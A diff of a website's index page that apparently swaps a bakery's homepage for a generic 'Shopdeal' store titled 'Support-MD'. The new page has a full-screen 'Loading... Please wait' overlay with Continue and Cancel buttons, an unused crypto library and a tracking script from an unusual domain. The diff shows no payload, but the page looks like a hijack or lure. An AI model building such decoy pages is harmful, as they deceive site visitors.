@@ -1,588 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ApricotTreat &bull; Artisanal Apricot Pâtisserie & Gourmet Orchard Confections</title>
-  <meta name="description" content="Experience handcrafted apricot pastries, French frangipane tarts, and copper-kettle confitures made with Blenheim and Malatya stone fruits at 181 Mercer Street, New York.">
-  <link rel="canonical" href="https://apricottreat.com/index.php">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 
-  <!-- Google Analytics Tag -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts via link tag -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Playfair+Display:ital,wght@0,500;0,700;0,800;1,400;1,700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-  <link rel="stylesheet" href="assets/css/style.css">
+
 </head>
 <body>
-  <header class="site-header">
-    <div class="header-container">
-      <a href="index.php" class="brand-logo">
-        Apricot<span>Treat</span>
-      </a>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">Orchard Atelier</a></li>
-        <li><a href="blog.html">Culinary Treatises</a></li>
-        <li><a href="contact.html">Tasting Salon</a></li>
-      </ul>
-      <div class="header-cta">
-        <a href="tel:+18887775845" class="header-phone">+1-888-777-5845</a>
-        <a href="contact.html" class="btn-primary">Reserve Tasting</a>
-      </div>
-      <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle Navigation" aria-expanded="false">
-        <span></span>
-        <span></span>
-        <span></span>
-      </button>
-    </div>
-  </header>
 
-  <div class="mobile-drawer" id="mobile-drawer">
-    <ul class="mobile-drawer-nav">
-      <li><a href="index.php">Confectionery Home</a></li>
-      <li><a href="about.html">Orchard Heritage</a></li>
-      <li><a href="blog.html">Culinary Treatises</a></li>
-      <li><a href="contact.html">Tasting Salon</a></li>
-      <li><a href="privacy-policy.html">Privacy Policy</a></li>
-      <li><a href="terms-and-conditions.html">Terms of Service</a></li>
-    </ul>
-    <div style="margin-top: 2.5rem; padding-top: 1.5rem; border-top: 1px solid var(--color-border);">
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-primary);margin-bottom:0.5rem;">+1-888-777-5845</p>
-      <p style="font-size:0.85rem;color:var(--color-text-muted);">181 Mercer Street, New York, NY 10012, United States</p>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
   </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- Section 1: Hero Banner -->
-<section class="hero">
-  <div class="container">
-    <div class="hero-grid">
-      <div>
-        <span class="hero-badge">&#10022; Handcrafted at 181 Mercer Street, NYC</span>
-        <h1 class="hero-title">Sun-Ripened Apricot Pâtisserie &amp; Orchard Delicacies</h1>
-        <p class="hero-lead">
-          Celebrating the delicate balance of high malic tartness and golden honeyed sweetness. We handcraft exquisite French tarts, copper-kettle confitures, and candied fruit delicacies from heritage stone fruits.
-        </p>
-        <div class="hero-actions">
-          <a href="contact.html" class="btn-primary">Reserve Tasting Salon</a>
-          <a href="blog.html" class="btn-secondary">Explore Culinary Science</a>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
-        <div style="margin-top:2.5rem;display:flex;gap:2rem;align-items:center;border-top:1px solid var(--color-border);padding-top:1.5rem;">
-          <div>
-            <div style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-primary);">66&deg; Brix</div>
-            <div style="font-size:0.85rem;color:var(--color-text-muted);">Optimal Confiture Gelation</div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
+      </div>
+    </div>
+
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
           </div>
-          <div style="height:35px;width:1px;background:var(--color-border);"></div>
-          <div>
-            <div style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-primary);">100% Pure</div>
-            <div style="font-size:0.85rem;color:var(--color-text-muted);">Blenheim &amp; Malatya Fruits</div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
           </div>
-          <div style="height:35px;width:1px;background:var(--color-border);"></div>
-          <div>
-            <div style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-primary);">Copper Vats</div>
-            <div style="font-size:0.85rem;color:var(--color-text-muted);">Traditional French Cauldrons</div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
           </div>
-        </div>
-      </div>
-      <div class="hero-img-wrap">
-        <img src="assets/images/hero_artisanal_apricot_culinary_pastry.jpg" alt="Artisanal glazed apricot tartlet with fresh botanicals">
-        <div class="hero-img-caption">
-          <strong>Haute Pâtisserie &bull; Mercer Street Kitchen</strong><br>
-          Caramelized heritage apricot tartlet finished with stone fruit reduction and edible gold.
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 2: Craft Pillars -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Orchard Confectionery Philosophy</span>
-      <h2 class="section-title">The Three Pillars of Apricot Gastronomy</h2>
-      <p class="section-lead">
-        Rejecting mass-produced high-fructose syrups in favor of peak-season orchard harvests, copper kettle evaporation, and classical pastry mastery.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="pillar-card">
-        <div class="pillar-num">01</div>
-        <h3 class="pillar-title">Heritage Pomological Terroir</h3>
-        <p class="pillar-text">
-          We source directly from century-old dry-farmed California Blenheim orchards and high-altitude Turkish Malatya groves, capturing intense aromatic sweetness and bright acidity.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <div class="pillar-num">02</div>
-        <h3 class="pillar-title">Pure Copper Cauldron Cooking</h3>
-        <p class="pillar-text">
-          Confitures are prepared in unlined French copper preserving pans, delivering immediate thermal conductivity that evaporates excess moisture in under twelve minutes to preserve fruit vibrancy.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <div class="pillar-num">03</div>
-        <h3 class="pillar-title">Artisanal Butter Lamination</h3>
-        <p class="pillar-text">
-          Our tart shells are hand-laminated with 84% European butter and stone-ground organic flour, producing hundreds of delicate flaky layers that cradle velvety almond frangipane.
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 3: Seasonal Menu Capsule -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Atelier Creations</span>
-      <h2 class="section-title">The Signature Apricot Confectionery Menu</h2>
-      <p class="section-lead">
-        Handmade in limited daily quantities at our Manhattan kitchen for private salon service and bespoke commissions.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/apricot_frangipane_tart_glace.jpg" alt="Classical French apricot frangipane tart">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Classical Pâtisserie &bull; Daily Bake</span>
-          <h3 class="card-title">The Blenheim Frangipane Tartelette</h3>
-          <p class="card-desc">Caramelized halved Blenheim apricots baked into almond marzipan cream inside a golden-brown butter crust, finished with clear fruit glaze.</p>
-          <div style="margin-top:auto;font-family:var(--font-mono);font-size:0.88rem;color:var(--color-primary);font-weight:700;">
-            Daily Limited Bake &bull; 181 Mercer Salon
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/apricot_souffle_glace_dessert_course.jpg" alt="Apricot soufflé glacé dessert course">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Gourmet Dessert &bull; Chilled Course</span>
-          <h3 class="card-title">Chilled Apricot Soufflé Glacé</h3>
-          <p class="card-desc">Airy frozen mousse infused with sun-dried apricot purée, organic clover honey, and toasted apricot kernel praline crunch.</p>
-          <div style="margin-top:auto;font-family:var(--font-mono);font-size:0.88rem;color:var(--color-primary);font-weight:700;">
-            Tasting Menu Feature &bull; 181 Mercer Salon
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/apricot_patisserie_petit_fours_confection.jpg" alt="Apricot glazed petit fours">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Confectionery &bull; Artisan Mignardise</span>
-          <h3 class="card-title">Malatya Apricot Glacé &amp; Pâte de Fruits</h3>
-          <p class="card-desc">Traditional French fruit jellies and candied whole apricots saturated over seven days in pure orchard nectar, rolled in cane crystals.</p>
-          <div style="margin-top:auto;font-family:var(--font-mono);font-size:0.88rem;color:var(--color-primary);font-weight:700;">
-            Bespoke Confection Box &bull; 181 Mercer Salon
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 4: Interactive Brix & Pectin Harmonizer -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Culinary Science Telemetry</span>
-      <h2 class="section-title">Apricot Pectin Gelation &amp; Brix Harmonizer</h2>
-      <p class="section-lead">
-        Calculate optimal cooking temperatures, natural fruit pectin gelation curves, and sugar concentration across diverse apricot varieties and culinary preparations.
-      </p>
-    </div>
-    <div class="calc-box">
-      <div class="calc-grid">
-        <div class="form-group">
-          <label class="form-label" for="calc-variety">Select Apricot Cultivar &amp; Terroir:</label>
-          <select id="calc-variety" class="form-select">
-            <option value="blenheim">California Blenheim (High Acidity, 18&deg; Fresh Brix)</option>
-            <option value="malatya">Turkish Malatya (Sun-Dried, Natural 68&deg; Concentrated Brix)</option>
-            <option value="canino">Mediterranean Canino (Firm Flesh, Rich Aromatic Pectin)</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label class="form-label" for="calc-confection">Target Pâtisserie Preparation:</label>
-          <select id="calc-confection" class="form-select">
-            <option value="tart">Laminated Almond Frangipane Tartelette (Oven Bake)</option>
-            <option value="glace">Seven-Day Candied Glacé Fruit (Cold Saturation)</option>
-            <option value="compote">Poached Stone Fruit Compote &amp; Glaze Reduction</option>
-          </select>
-        </div>
-      </div>
-      <div class="calc-result">
-        <div class="calc-metric" id="calc-result-metric">58&deg; Brix &bull; Almond Frangipane Balance</div>
-        <div class="calc-caption" id="calc-result-caption">Vibrant Stone Fruit Tartness &bull; Golden Butter Lamination &bull; Zero Syneresis</div>
-      </div>
-      <div style="text-align:center;margin-top:1.5rem;">
-        <button id="calc-btn" class="btn-primary">Harmonize Confection Chemistry</button>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 5: Pectin Science & Copper Kettle Chemistry -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <span class="section-tag">Copper Kettle Alchemy</span>
-        <h2 class="section-title" style="text-align:left;">The Thermodynamic Magic of Red Copper</h2>
-        <p style="margin-bottom:1.25rem;color:var(--color-text-muted);">
